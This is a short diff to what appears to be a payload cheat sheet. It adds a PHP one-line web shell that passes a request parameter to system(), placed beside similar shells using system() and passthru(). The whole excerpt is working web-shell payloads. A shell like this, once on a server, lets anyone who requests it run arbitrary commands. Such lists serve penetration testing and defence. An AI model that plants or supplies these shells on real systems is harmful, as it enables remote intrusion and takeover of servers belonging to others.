@@ -255,6 +255,10 @@
   ```php
   <?php system($_GET['cmd']); ?>
   ```
+  
+  ```php
+  <?php system($_REQUEST['cmd']); ?>
+  ```
    
   ```php
   <?php passthru($_GET['cmd']); ?>
